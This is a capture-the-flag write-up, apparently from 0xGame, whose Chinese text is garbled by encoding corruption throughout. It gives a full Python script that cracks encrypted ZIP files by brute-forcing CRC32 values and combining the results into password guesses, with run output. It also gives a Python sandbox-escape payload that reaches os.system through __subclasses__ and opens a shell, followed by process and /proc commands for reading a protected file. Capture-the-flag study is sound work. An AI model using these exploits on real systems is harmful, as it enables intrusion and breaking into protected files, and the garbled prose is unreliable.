ç®€å•è¯´è¯´è¿™ä¸ªæ”»å‡»æ–¹æ³•çš„åŸç†ï¼Œç”±äºå‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶å†…å®¹å¾ˆå°å¾ˆå°ï¼Œé‚£ä¹ˆå®Œå…¨å¯ä»¥é€šè¿‡çˆ†ç ´çš„æ–¹å¼ï¼Œé€šè¿‡ç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„ 3 å­—èŠ‚ï¼ˆçœ‹æœªå‹ç¼©å¤§å°ï¼‰æ–‡ä»¶ï¼Œç„¶åå’Œå‹ç¼©åŒ…é‡Œçš„ crc32 å€¼è¿›è¡ŒåŒ¹é…ï¼Œè¦æ˜¯æˆåŠŸäº†ï¼Œå°±å¯ä»¥æ‹¿å®ƒå½“ä½œå·²çŸ¥æ˜æ–‡è¿›è¡Œæ˜æ–‡æ”»å‡»ï¼Œè·å– flagï¼Œåˆ°è¿™ä¸€æ­¥å°±å¾ˆè½»æ¾äº†

ç„¶åç®€å•è¯´ä¸‹æˆ‘çš„è§£å¯†è„šæœ¬é€»è¾‘ï¼Œå½“æœªå‹ç¼©å¤§å°åœ¨ 4 å­—èŠ‚ä¹‹å†…çš„è¯ï¼Œé‚£å°±ç›´æ¥**æ˜æ–‡ç©·ä¸¾çˆ†ç ´**å³å¯ ã€‚ç„¶åå¤§å°è¶…è¿‡ 4 å­—èŠ‚æ—¶ï¼Œéœ€è¦ä½¿ç”¨[ä¸“é—¨çš„æ•°å­¦å·¥å…·](https://github.com/theonlypwner/crc32/blob/main/crc32.py)è¿›è¡Œ crc åè½¬æ”»å‡»ï¼ŒåŸç†æ¶‰åŠå¯†ç å­¦ï¼Œzip åŠ å¯†åŸç†ç­‰ç­‰ï¼ˆå¤ªå¤æ‚ï¼Œæ²¡å­¦ä¼šï¼Œå°±ç›´æ¥å¼•ç”¨ theonlypwner å¤§ä½¬çš„å·¥å…·ï¼Œç„¶åæˆ‘å†åœ¨ä»–çš„å·¥å…·åŸºç¡€ä¸Šï¼Œæ‹“å±•äº†è‡ªè¡Œæœé›† crcï¼Œè‡ªè¡Œæ£€æµ‹å¯†ç æ˜¯å¦æ­£ç¡®çš„å°åŠŸèƒ½

ç†è®ºä¸Šï¼Œå•çº¯ä½¿ç”¨ crc åè½¬æ”»å‡»å‡ ä¹å¯ä»¥å®ç°æ‰€æœ‰å°å­—èŠ‚çš„çˆ†ç ´æ”»å‡»ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œä¾ç„¶é€‰æ‹©ä¿ç•™ 4 å­—èŠ‚ä»¥ä¸‹çš„æ˜æ–‡ç©·ä¸¾çˆ†ç ´è¿‡ç¨‹ï¼Œå› ä¸ºé‚£ä½å¤§ä½¬çš„å·¥å…·å†…ç½®çš„å­—ç¬¦é›†é‡Œé¢ä¸åŒ…å«ä¸­æ–‡å­—ç¬¦æˆ–åˆ«çš„ç‰¹æ®Šå­—ç¬¦

> æœ‰ç‚¹ç–‘æƒ‘ï¼Œä¸ºå•¥ä¹‹å‰è§åˆ°çš„ crc32 çˆ†ç ´ï¼Œéƒ½ç†æ‰€å½“ç„¶çš„è®¤ä¸ºå°æ–‡ä»¶é‡Œé¢å°±æ”¾ç€å‹ç¼©åŒ…å¯†ç ï¼Ÿè¿™æ¬¡ç§»åŠ¨çº¿ä¸‹äº¤æµèµ›é‡Œé¢ï¼Œé‚£ä¸ªã€Šå¤©ä¹¦ã€‹é¢˜ç›®å°±è¢«æˆ‘ä¹‹å‰ç ”ç©¶è¿‡çš„è„šæœ¬ä¸€æŠŠæ¢­äº†ï¼Œå®ƒçš„è€ƒç‚¹æ˜¯å°†ä¸€ä¸ª png å›¾ç‰‡æŒ‰ç…§ 1 ä¸ªå­—èŠ‚å­˜å‚¨ 1 ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢å¾ˆå¤šå¾ˆå¤šæ–‡ä»¶ï¼Œé€šè¿‡æˆ‘çš„è„šæœ¬ï¼Œä¸€æŠŠæ¢­ï¼Œå°†å®Œæ•´çš„ png ç»™çˆ†ç ´å‡ºæ¥ï¼Œæ‹¿åˆ° POA(è¿™ä¸ªæ¯”èµ›é‡Œçš„ flag)

#### how to solve

æˆ‘ç»™å‡ºçš„å‚è€ƒè„šæœ¬ï¼Œæˆ‘ä»æˆ‘ä¹‹å‰å†™çš„é¡¹ç›®ä¸­æˆªå–éƒ¨åˆ†å¼„å‡ºæ¥çš„ï¼Œè¿˜æ˜¯æœ‰ç‚¹å†—ä½™ï¼Œä½†æ˜¯æ”¾å‡ºæ¥ï¼Œå¤§å®¶å¯ä»¥å­˜ä¸€ä»½ï¼Œè›®é€‚ç”¨ crc çˆ†ç ´æ”»å‡»çš„ï¼Œå¦‚æœçˆ†ç ´é•¿åº¦è¶…è¿‡ 4 å­—èŠ‚ï¼Œéœ€è¦å¤§å®¶å»å°†ä¸Šé¢ç»™çš„å¤§ä½¬å†™çš„æ•°å­¦å·¥å…·ä¸‹è½½ä¸‹æ¥ï¼Œæ”¾åˆ°åŒä¸€ç›®å½•ä¸‹å°±å¯ä»¥äº†

```python
import zipfile
import argparse
import itertools
import subprocess
import re
import zlib
import os
from tqdm import tqdm


def bytes_to_hex_or_str(content: bytes) -> str:
    """
    å°†å­—èŠ‚ä¸²è½¬æ¢ä¸ºå¯è¯»çš„å­—ç¬¦ä¸²æˆ–åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚
    å¦‚æœèƒ½è§£ç ä¸ºå¯æ‰“å°çš„ UTF-8 å­—ç¬¦ä¸²ï¼ˆåŒ…æ‹¬ä¸­æ–‡ï¼‰ï¼Œåˆ™è¿”å›è¯¥å­—ç¬¦ä¸²ï¼›
    å¦åˆ™ï¼ˆå³äºŒè¿›åˆ¶æºç ä¿¡æ¯æˆ–æ§åˆ¶å­—ç¬¦ï¼‰ï¼Œè¿”å›å…¶åå…­è¿›åˆ¶è¡¨ç¤ºã€‚
    """
    try:
        # 1. å°è¯•ä½¿ç”¨ UTF-8 è§£ç 
        decoded_str = content.decode('utf-8')

        if decoded_str.isprintable():
             return f"'{decoded_str}'"
        else:
             # 3. å¦‚æœåŒ…å«æ§åˆ¶å­—ç¬¦ï¼Œè§†ä¸ºäºŒè¿›åˆ¶/æºç ä¿¡æ¯ï¼Œè½¬ä¸ºåå…­è¿›åˆ¶
             return content.hex()
             
    except UnicodeDecodeError:
        # 4. è§£ç å¤±è´¥ï¼ˆçº¯äºŒè¿›åˆ¶æ•°æ®ï¼‰ï¼Œç›´æ¥è½¬ä¸ºåå…­è¿›åˆ¶
        return content.hex()
        
    except Exception:
        # 5. å…¶ä»–å¼‚å¸¸ (å®‰å…¨èµ·è§)
        return content.hex()

def extract_targets(zip_filename: str) -> list:
    """åˆ†æ ZIP æ–‡ä»¶ï¼Œæå–æ‰€æœ‰åŠ å¯†æ–‡ä»¶ä¿¡æ¯ã€‚"""
    targets = []
    print(f"[*] æ­£åœ¨åˆ†æå‹ç¼©åŒ…: {zip_filename}")
    try:
        with zipfile.ZipFile(zip_filename, 'r') as zf:
            for info in zf.infolist():
                # æ£€æŸ¥æ˜¯å¦åŠ å¯† (flag_bits & 0x1) ä¸”éç©º
                if info.flag_bits & 0x1 and info.file_size > 0:
                    targets.append({
                        "filename": info.filename, "size": info.file_size, "crc": info.CRC
                    })

        def sort_key(target):
            # å°è¯•æŒ‰æ–‡ä»¶åä¸­çš„æ•°å­—æ’åºï¼Œå¦‚æœæ²¡æœ‰æ•°å­—åˆ™æ”¾åé¢
            match = re.search(r'(\d+)', target['filename'])
            if match:
                return (int(match.group(1)), target['filename'])
            return (float('inf'), target['filename'])

        targets.sort(key=sort_key)
        print(f"[+] å‘ç° {len(targets)} ä¸ªåŠ å¯†æ–‡ä»¶ã€‚")
    except (FileNotFoundError, zipfile.BadZipFile) as e:
        print(f"[!] é”™è¯¯: {e}")
    return targets

def brute_force_many_short_files(targets: list):
    """é«˜æ•ˆæ‰¹é‡çˆ†ç ´ <= 3 ä½å…ƒçµ„çš„æ–‡ä»¶ã€‚"""
    if not targets: return {}, {}
    print(f"[*] æª¢æ¸¬åˆ° {len(targets)} ä¸ªå°æ–‡ä»¶ (<=3 å­—ç¯€)ï¼Œæº–å‚™è¿›è¡Œé«˜æ•ˆæ‰¹é‡çˆ†ç ´...")
    size_groups = {}
    for t in targets:
        size = t['size']
        if size not in size_groups: size_groups[size] = []
        size_groups[size].append(t)

    crc_to_plaintext = {}
    for length, group_targets in size_groups.items():
        print(f" Â [-] å¼€å§‹å¯¹ {len(group_targets)} ä¸ªå¤§å°ä¸º {length} å­—èŠ‚çš„æ–‡ä»¶è¿›è¡Œçˆ†ç ´...")
        group_crc_map = {t['crc']: t['filename'] for t in group_targets}
        # tqdm çš„ total åº”è¯¥ä¸º 256**length
        pbar = tqdm(itertools.product(range(256), repeat=length), total=256**length, desc=f" Â  Â -> {length}å­—èŠ‚çˆ†ç ´", unit="B", leave=False)
        found_count = 0
        for byte_tuple in pbar:
            plaintext_bytes = bytes(byte_tuple)
            crc_val = zlib.crc32(plaintext_bytes) & 0xFFFFFFFF
            if crc_val in group_crc_map and crc_val not in crc_to_plaintext:
                crc_to_plaintext[crc_val] = plaintext_bytes
                found_count += 1
                pbar.set_postfix_str(f"å·²æ‰¾åˆ° {found_count}/{len(group_crc_map)} ä¸ª")
            if found_count == len(group_crc_map):
                pbar.update(pbar.total - pbar.n) # åŠ é€Ÿè¿›åº¦æ¡å®Œæˆ
                break
        pbar.close()

    crc_map = {}
    for t in targets:
        if t['crc'] not in crc_map: crc_map[t['crc']] = []
        crc_map[t['crc']].append(t['filename'])

    return crc_map, crc_to_plaintext

def reverse_crc_long(targets: list, crc_tool_path: str) -> dict:
    """å¯¹ 4-7 ä½å…ƒçµ„çš„æ–‡ä»¶é€²è¡Œ CRC åè½‰ã€‚"""
    if not targets: return {}
    print(f"[*] æª¢æ¸¬åˆ° {len(targets)} å€‹ä¸­ç­‰å¤§å°æ–‡ä»¶ (4-7 å­—ç¯€)ï¼Œæº–å‚™é€²è¡Œ CRC åè½‰...")
    fragments_map = {}
    for target in targets:
        filename = target['filename']
        print(f" Â [-] æ­£åœ¨è°ƒç”¨å¤–éƒ¨å·¥å…·ä¸º '{filename}' (å¤§å°: {target['size']} B, CRC: {hex(target['crc'])}) è¿›è¡Œåè½¬...")
        # ç¡®ä¿ä½¿ç”¨ python3 è°ƒç”¨
        command = ["python3", crc_tool_path, "reverse", hex(target['crc'])]
        try:
            # å¢åŠ  timeout é¿å…å¡æ­»
            proc = subprocess.run(command, capture_output=True, text=True, check=True, encoding='utf-8', errors='ignore', timeout=300)
            # ä¿®æ­£æ­£åˆ™ï¼ŒåŒ¹é…å¯èƒ½çš„åå…­è¿›åˆ¶è¾“å‡ºæˆ–å­—ç¬¦ä¸²è¾“å‡º
            fragments = re.findall(r"(?:alternative|bytes|hex):\s+(.+?)\s+\(OK\)", proc.stdout)
            
            processed_fragments = []
            for frag in fragments:
                frag = frag.strip().strip("'\"") # æ¸…ç†å¼•å·
                # å°è¯•å°†ç¢ç‰‡è½¬æ¢ä¸º bytesï¼ˆå¦‚æœæ˜¯åå…­è¿›åˆ¶ï¼‰
                if len(frag) % 2 == 0 and all(c in '0123456789abcdefABCDEF' for c in frag):
                    try:
                        processed_fragments.append(bytes.fromhex(frag))
                    except ValueError:
                        processed_fragments.append(frag)
                else:
                    # å‡å®šä¸º ASCII/UTF-8 å­—ç¬¦ä¸²
                    processed_fragments.append(frag)
            
            if processed_fragments:
                # åªä¿ç•™å”¯ä¸€çš„ç»“æœï¼Œå¹¶ä¿æŒåŸå§‹é¡ºåº
                unique_fragments = []
                for frag in processed_fragments:
                    if frag not in unique_fragments:
                        unique_fragments.append(frag)
                fragments_map[filename] = unique_fragments
                
        except subprocess.TimeoutExpired:
            print(f"\n[!] è°ƒç”¨ '{crc_tool_path}' è¶…æ—¶ã€‚")
        except Exception as e:
            print(f"\n[!] è°ƒç”¨ '{crc_tool_path}' å¤±è´¥: {e}")
            
    return fragments_map

def test_password(zip_filename: str, password_bytes: bytes, test_file: str) -> bool:
    try:
        with zipfile.ZipFile(zip_filename, 'r') as zf:
            zf.read(test_file, pwd=password_bytes)
        return True
    except Exception:
        return False


def main():
    parser = argparse.ArgumentParser(description="ç»ˆæå®Œç¾ç‰ˆ CRC æ”»å‡»è„šæœ¬ V12 (å·²ç§»é™¤ bkcrack KPA)ã€‚")
    parser.add_argument("zip_file", help="éœ€è¦ç ´è§£çš„ ZIP æ–‡ä»¶è·¯å¾„ã€‚")
    parser.add_argument("--tool", type=str, default="crc32.py", help="å¯ç”¨çš„ crc32.py å·¥å…·è·¯å¾„ã€‚")
    args = parser.parse_args()

    all_targets = extract_targets(args.zip_file)
    if not all_targets: return

    short_targets = [t for t in all_targets if t['size'] <= 3]
    medium_targets = [t for t in all_targets if 4 <= t['size'] <= 7]
    large_targets = [t for t in all_targets if t['size'] >= 8]

    print(f"\n[*] æ–‡ä»¶åˆ†æå®Œæˆï¼Œåˆ†ç»„å¦‚ä¸‹:")
    print(f" Â - {len(short_targets)} ä¸ªå°æ–‡ä»¶ (<=3 å­—èŠ‚) -> å°†ä½¿ç”¨äºŒè¿›åˆ¶çˆ†ç ´")
    print(f" Â - {len(medium_targets)} ä¸ªä¸­ç­‰æ–‡ä»¶ (4-7 å­—èŠ‚) -> å°†ä½¿ç”¨ CRC åè½¬")
    print(f" Â - {len(large_targets)} ä¸ªå¤§æ–‡ä»¶ (>=8 å­—èŠ‚) -> å°†è¢«å¿½ç•¥")
    print("-" * 50)

    final_results = {} # {filename: [content1, content2, ...]}
    
    if short_targets:
        crc_map, crc_to_plaintext = brute_force_many_short_files(short_targets)
        for crc, plaintext in crc_to_plaintext.items():
            for fname in crc_map.get(crc, []):
                final_results[fname] = [plaintext]

    if medium_targets:
        fragments_map = reverse_crc_long(medium_targets, args.tool)
        for fname, frags in fragments_map.items():
            final_results[fname] = frags

    if not final_results:
        print("\n[!] æœªèƒ½ç ´è§£æˆ–æ¢å¤ä»»ä½•æ–‡ä»¶å†…å®¹ã€‚")
        return

    print("\n" + "="*50); print("ğŸ‰ [+] åˆæ­¥ç ´è§£/æ¢å¤å®Œæˆï¼ç»“æœå¦‚ä¸‹ï¼š"); print("="*50)
    ordered_cracked_filenames = [t['filename'] for t in all_targets if t['filename'] in final_results]

    decoded_parts_for_summary = []
    for filename in ordered_cracked_filenames:
        content_list = final_results[filename]
        display_parts = []
        summary_part = "" # ç”¨äºæ‹¼æ¥çš„ç¬¬ä¸€ä¸ªç»“æœ

        for i, content in enumerate(content_list):
            if isinstance(content, bytes):
                # ä½¿ç”¨ä¼˜åŒ–åçš„å‡½æ•°å¤„ç† bytes ç±»å‹
                display_str = bytes_to_hex_or_str(content)
                summary_part = display_str.strip("'")
                display_parts.append(display_str)
            else:
                # CRC åè½¬å·¥å…·è¾“å‡ºçš„å­—ç¬¦ä¸²
                display_parts.append(f"'{content}'")
                summary_part = content
                    
        decoded_parts_for_summary.append(summary_part)
        print(f" Â -> æ–‡ä»¶ '{filename}': [{', '.join(display_parts)}]")

    print("\n[*] ä»¥ä¸Šæ‰€æœ‰ç»“æœçš„**é¦–ä¸ª**å¯èƒ½æ€§æ‹¼æ¥åçš„å†…å®¹ä¸º:")
    full_decoded_text = "".join(decoded_parts_for_summary)
    print(f" Â  Â æ‹¼æ¥å†…å®¹: {full_decoded_text}")

    try:
        choice = input("\n[?] æ˜¯å¦è¦ç»§ç»­å°è¯•è‡ªåŠ¨æ”»å‡»ï¼ˆå¯†ç ç»„åˆï¼‰ï¼Ÿ(y/n): ")
    except KeyboardInterrupt:
        print("\næ“ä½œå·²å–æ¶ˆã€‚"); return
    if choice.lower() != 'y':
        print("[*] æ“ä½œç»“æŸã€‚"); return

    if medium_targets:
        print("\n--- å°è¯•å°† CRC åè½¬ç»“æœç»„åˆæˆå¯†ç  ---")
        password_fragment_lists = [final_results[t['filename']] for t in medium_targets if t['filename'] in final_results]
        
        cleaned_password_fragment_lists = []
        for frag_list in password_fragment_lists:

             cleaned_frag_list = [f.decode('utf-8', errors='ignore') if isinstance(f, bytes) else f for f in frag_list]
             cleaned_password_fragment_lists.append(list(set(f for f in cleaned_frag_list if f)))
             
        if any(cleaned_password_fragment_lists):
            test_file = max(all_targets, key=lambda t: t['size'])['filename']
            print(f"[*] è‡ªåŠ¨é€‰æ‹©æœ€å¤§æ–‡ä»¶ '{test_file}' ç”¨äºå¯†ç éªŒè¯ã€‚")
            
            total_passwords = 1
            for frags in cleaned_password_fragment_lists: total_passwords *= len(frags)
            
            pbar = tqdm(itertools.product(*cleaned_password_fragment_lists), total=total_passwords, desc=" Â -> å°è¯•å¯†ç ", unit="Combo")
            for combo in pbar:
                password_str = "".join(combo)
                password_bytes = password_str.encode('utf-8')
                
                display_pwd = password_str[:30] + '...' if len(password_str) > 30 else password_str
                pbar.set_postfix_str(f"æ­£åœ¨å°è¯•: '{display_pwd}'")
                
                if test_password(args.zip_file, password_bytes, test_file):
                    pbar.close()
                    print("\n" + "="*50); print(f"ğŸ‰ [+] æœ€ç»ˆå¯†ç éªŒè¯æˆåŠŸï¼"); print(f" Â >>> Â {password_str} Â <<<"); print("="*50)
                    return
            print("\n[!] æœªèƒ½è‡ªåŠ¨éªŒè¯å‡ºæ­£ç¡®çš„å¯†ç ç»„åˆã€‚")
        else:
             print("[*] æ²¡æœ‰å¯ç”¨çš„ CRC åè½¬ç»“æœç”¨äºå¯†ç ç»„åˆã€‚")


if __name__ == "__main__":
    main()
    
"""
olo@yolo:~/Desktop/timu/0xGame/å¼€é”å¸ˆå‚…$ python crcdecrypt.py attachment.zip
[*] æ­£åœ¨åˆ†æå‹ç¼©åŒ…: attachment.zip
[+] å‘ç° 40 ä¸ªåŠ å¯†æ–‡ä»¶ã€‚

[*] æ–‡ä»¶åˆ†æå®Œæˆï¼Œåˆ†ç»„å¦‚ä¸‹:
 Â - 38 ä¸ªå°æ–‡ä»¶ (<=3 å­—èŠ‚) -> å°†ä½¿ç”¨äºŒè¿›åˆ¶çˆ†ç ´
 Â - 0 ä¸ªä¸­ç­‰æ–‡ä»¶ (4-7 å­—èŠ‚) -> å°†ä½¿ç”¨ CRC åè½¬
 Â - 2 ä¸ªå¤§æ–‡ä»¶ (>=8 å­—èŠ‚) -> å°†è¢«å¿½ç•¥
--------------------------------------------------
[*] æª¢æ¸¬åˆ° 38 ä¸ªå°æ–‡ä»¶ (<=3 å­—ç¯€)ï¼Œæº–å‚™è¿›è¡Œé«˜æ•ˆæ‰¹é‡çˆ†ç ´...
 Â [-] å¼€å§‹å¯¹ 19 ä¸ªå¤§å°ä¸º 3 å­—èŠ‚çš„æ–‡ä»¶è¿›è¡Œçˆ†ç ´...
 Â [-] å¼€å§‹å¯¹ 19 ä¸ªå¤§å°ä¸º 1 å­—èŠ‚çš„æ–‡ä»¶è¿›è¡Œçˆ†ç ´...

==================================================
ğŸ‰ [+] åˆæ­¥ç ´è§£/æ¢å¤å®Œæˆï¼ç»“æœå¦‚ä¸‹ï¼š
==================================================
 Â -> æ–‡ä»¶ '1.txt': ['å¥½']
 Â -> æ–‡ä»¶ '2.txt': ['åƒ']
......çœç•¥éƒ¨åˆ†......
 Â -> æ–‡ä»¶ '34.txt': ['x']
 Â -> æ–‡ä»¶ '35.txt': ['G']
 Â -> æ–‡ä»¶ '36.txt': ['a']
 Â -> æ–‡ä»¶ '37.txt': ['m']
 Â -> æ–‡ä»¶ '38.txt': ['e']

[*] ä»¥ä¸Šæ‰€æœ‰ç»“æœçš„**é¦–ä¸ª**å¯èƒ½æ€§æ‹¼æ¥åçš„å†…å®¹ä¸º:
 Â  Â æ‹¼æ¥å†…å®¹: å¥½åƒæœ‰ä¸ªå¾ˆé‡è¦çš„æ–‡ä»¶,å°±è®°ä½äº†å‰é¢çš„å†…å®¹:welcome_to_0xGame

[?] æ˜¯å¦è¦ç»§ç»­å°è¯•è‡ªåŠ¨æ”»å‡»ï¼ˆå¯†ç ç»„åˆï¼‰ï¼Ÿ(y/n): y
yolo@yolo:~/Desktop/timu/0xGame/å¼€é”å¸ˆå‚…$
"""
```

è¿›è¡Œ bkcrack -L æˆ–è€… bandzip åˆ†æçš„æ—¶å€™ï¼Œä¼šæ³¨æ„åˆ°å‹ç¼©åŒ…é‡Œé¢æœ‰ä¸ª VIP_fileï¼Œæ¥ä¸‹æ¥æˆ‘å°±ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶è€ƒå¯Ÿäº†æ˜æ–‡æ”»å‡»ï¼Œweek2 è§£å†³äº†ï¼Œåº”è¯¥éƒ½æŒæ¡äº†å§ï¼Œä¸ä¼šçš„ï¼Œå›åˆ° week2 å†å­¦

> è¿™é‡Œå°±ç•™ä¸ªæˆªå›¾å¥½äº†

### Jail å¤§é€ƒäº¡

> æ‰“äº† moe çš„ Jail3ï¼Œçªå‘å¥‡æƒ³ï¼Œæƒ³è¯»å– main.pyï¼Œå‘ç°è¿™é‡Œçš„æƒé™æ˜¯å®Œå…¨ä¸å¯è¯»çš„ï¼Œä¸è¿‡çœ‹çœ‹è¿›ç¨‹ï¼Œå°±æœ‰äº†æ³•å­ğŸ¤­

#### pass pyjail

å…ˆå®¡è®¡ jail

```python
def jail():
    while True:
        player_input=input("Please input your code here: ")
        try:
            result=eval(player_input,{"__builtins__":None},{})
            print("Code have been executed")
            if result is not None:
                print(f"Return value: {result}")

        except Exception as e:
            print(f"Execution error: {type(e).__name__}: {e}")
```

ä¼šå‘ç°å°†æ‰€æœ‰å†…ç½®å‡½æ•°ï¼ˆå¦‚ print,open,exec,eval ç­‰ï¼‰æ¸…ç©ºï¼Œå¹¶åœ¨ç¬¬ä¸‰ä¸ªå‚æ•°ä¸­ä¼ å…¥ä¸€ä¸ªç©ºå­—å…¸ä½œä¸ºå…¨å±€å‘½åç©ºé—´ï¼Œä»è€Œé™åˆ¶äº†å¯æ‰§è¡Œçš„ä»£ç 

è¿™ç±»æ˜¾ç„¶æ˜¯æ‰“ç»§æ‰¿é“¾äº†ï¼Œæ ¸å¿ƒæ€è·¯æ˜¯ï¼š

* **æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„å¯¹è±¡ï¼š** åœ¨å½“å‰å—é™çš„ç¯å¢ƒä¸­ï¼Œå¯»æ‰¾ä¸€ä¸ªèƒ½å¤Ÿè®¿é—®å…¶ç±»çš„å¯¹è±¡ã€‚é€šå¸¸è¿™ä¸ªå¯¹è±¡ä¼šæ˜¯ä¸€ä¸ªå†…ç½®ç±»å‹ï¼ˆå¦‚å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„ç­‰ï¼‰æˆ–ä¸€ä¸ªå‡½æ•°ã€‚

* **è·å–è¯¥å¯¹è±¡çš„ç±»ï¼ˆ**`__class__`**ï¼‰ï¼š** åˆ©ç”¨ `.__class__` å±æ€§è·å–è¯¥å¯¹è±¡çš„ç±»å‹ã€‚

* **è·å–åŸºç±»ï¼ˆ**`__base__`**&#x20;æˆ–&#x20;**`__bases__`**ï¼‰ï¼š** é€šè¿‡ç±»çš„ `.__base__` (å•ä¸ªåŸºç±») æˆ– `.__bases__` (æ‰€æœ‰åŸºç±»ç»„æˆçš„å…ƒç»„) å±æ€§ï¼Œå‘ä¸Šè¿½æº¯ç»§æ‰¿é“¾ï¼Œç›´åˆ°æ‰¾åˆ°æœ€é¡¶å±‚çš„åŸºç±» `object`ã€‚

* **æŸ¥æ‰¾å­ç±»ï¼ˆ**`__subclasses__`**ï¼‰ï¼š** ä¸€æ—¦è·å¾— `object` ç±»ï¼Œå°±å¯ä»¥è°ƒç”¨å®ƒçš„ `__subclasses__()` æ–¹æ³•ï¼Œè·å¾—å½“å‰ Python è¿›ç¨‹ä¸­**æ‰€æœ‰å·²åŠ è½½çš„ç±»**çš„åˆ—è¡¨ã€‚

* **æ‰¾åˆ°ä¸€ä¸ªåŒ…å«å±é™©åŠŸèƒ½ï¼ˆå¦‚æ‰§è¡Œå‘½ä»¤ï¼‰çš„ç±»ï¼š** åœ¨ `__subclasses__()` è¿”å›çš„åˆ—è¡¨ä¸­ï¼Œå¯»æ‰¾ä¸€ä¸ªæœ‰ç”¨çš„ç±»ï¼Œä¾‹å¦‚ï¼š

* * `warnings.catch_warnings`

* * `subprocess.Popen`

* * `os._wrap_close`

ç®€å•ä¸¾ä¾‹ï¼Œä½ çœ‹ï¼Œä»åŸºæœ¬çš„å­—ç¬¦ä¸²å‘ä¸Šè¿½æº¯ï¼Œæ˜¾ç¤ºè·å–å­—ç¬¦ä¸²çš„ç±»ï¼š`str`ï¼Œç„¶åè·å–åŸºç±»ï¼š`object`ï¼Œå†å‘ä¸Šç›´æ¥å¯ä»¥è·å–æ‰€æœ‰å­ç±»ï¼š`subclasses`

è¿™é‡Œä¸»è¦æ˜¯å’Œ python çš„ç»“æ„æœ‰å…³ç³»ï¼Œè¿™é‡Œä¸åšè¯¦ç»†è§£é‡Šï¼Œéœ€è¦å¤§å®¶å‰å¾€ python å®˜æ–¹æ–‡æ¡£å­¦å­¦ï¼ˆä¸å­¦ä¹Ÿå¯ä»¥ï¼Œè®°ä½æœ‰è¿™æ ·çš„ç»“æ„å°±å¥½äº†ï¼Œç„¶åç»™å‡ºæˆ‘çš„ payload

```bash
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("sh")
```

è¿™ä¸ª payload å¾ˆä¼˜é›…å§

#### payload è¯¦ç»†è§£å‰–

* `''`,è¿™æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²å¯¹è±¡ï¼ˆå¯ä»¥çœ‹ä½œæˆ‘ä¸Šé¢ä¸¾ä¾‹ä¸­ç”¨åˆ°çš„å­—ç¬¦ä¸²å¯¹è±¡'abc'ï¼Œè¿™æ˜¯æˆ‘ä»¬æ‰“ç»§æ‰¿é“¾çš„èµ·ç‚¹

* `.__class__`è·å–äº†ç©ºå­—ç¬¦ä¸²çš„ç±»ï¼Œç»“æœæ˜¯`<class 'str'>`

* `.__base__`è·å– str ç±»çš„åŸºç±»ï¼Œç»“æœæ˜¯`<class 'object'>`,è¿™é‡Œå¾ˆå…³é”®ï¼Œå› ä¸º object ç±»ä¸‹çš„`__subclasses__`æ–¹æ³•ä¸­æœ‰å¾ˆå¤šå¾ˆå¤šæˆ‘ä»¬èƒ½ç”¨åˆ°çš„æ–¹æ³•

æ¥ä¸‹æ¥æˆ‘ä½¿ç”¨äº†åˆ—è¡¨æ¨å¯¼å¼æŸ¥æ‰¾åˆ°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•

* `for x in ......subclasswd......`ï¼Œè¿™é‡Œéå†äº†æ‰€æœ‰çš„ç±»(x)

* `if x.__name__=="_wrap_class"`,è¿™é‡Œåªä¿ç•™äº†ç±»åä¸º`_wrap_close`çš„ç±»ï¼Œè¿™ä¸ªç±»åœ¨ python ä¸­é€šå¸¸æ˜¯`os._wrap_close`

* `x.__init__.globals__`,è¿™é‡Œå¯¹äºæˆ‘ä»¬ç­›é€‰å‡ºæ¥çš„ç±»`(os._wrap_close)`è·å–å…¶åˆå§‹åŒ–æ–¹æ³•`__init__`çš„å…¨å±€å‘½åç©ºé—´ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªå…³é”®çš„æ–¹æ³•å systemï¼Œç†Ÿæ‚‰ python æ‰§è¡Œ shell å‘½ä»¤çš„ï¼Œä¸€å®šè§è¿‡ os.system()å§ï¼Œå°±æ˜¯è¿™ä¸ªæ„æ€

* æˆ‘ä»¬ä½¿ç”¨é‚£ä¸ªåˆ—è¡¨æ¨å¯¼å¼æ‹¿åˆ°çš„ç±»é‡Œé¢ï¼Œæ­£å¸¸æ¥è¯´åªæœ‰ os._wrap_closeï¼Œæ‰€ä»¥ç”¨[0]ç´¢å¼•å°±å¥½äº†ï¼Œå°†å®ƒ init åˆå§‹åŒ–å¾—åˆ°å…¨å±€å­—å…¸é‡Œé¢æœ‰æˆ‘ä»¬éœ€è¦çš„æ–¹æ³•å systemï¼Œç„¶åè°ƒç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæœ€åé€šè¿‡ sh å‘½ä»¤ï¼Œå°±èƒ½æ‹¿åˆ° shellï¼Œæ²™ç®±é€ƒé€¸æˆåŠŸ

#### pass root_privileges

ç»•è¿‡ python jailï¼Œæ‹¿åˆ° shell åï¼Œå‘ç°æœ‰ä¸ªæ–‡ä»¶çš„å†…å®¹è®©æˆ‘ä»¬æƒ³åŠæ³•è¯»å– main.pyï¼Œä½†æ˜¯å½“å‰æˆ‘ä»¬æ˜¯ nobody è¿™æ ·çš„æœ€ä½æƒé™ï¼Œä¸èƒ½è¯»å–ï¼Œæ¥ä¸‹æ¥çš„æ“ä½œç®—æ˜¯ä¸€ä¸ªå°å‹ææƒå¤„ç†

```bash
~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.3  0.0  20612 15248 ?        Ss   08:10   0:00 python3 main.py
nobody         7  0.2  0.0  20600 14820 ?        S    08:10   0:00 python3 /proc/self/fd/4 fork
nobody         8  0.0  0.0   2584   932 ?        S    08:10   0:00 sh -c sh
nobody         9  0.0  0.0   2584   956 ?        S    08:10   0:00 sh
nobody        10  0.0  0.0   8484  4208 ?        R    08:11   0:00 ps aux
~$ ls -la /proc/self/fd/4
lrwx------ 1 nobody root 64 Oct 17 08:11 /proc/self/fd/4 -> /memfd:/app/main.py (deleted)
```

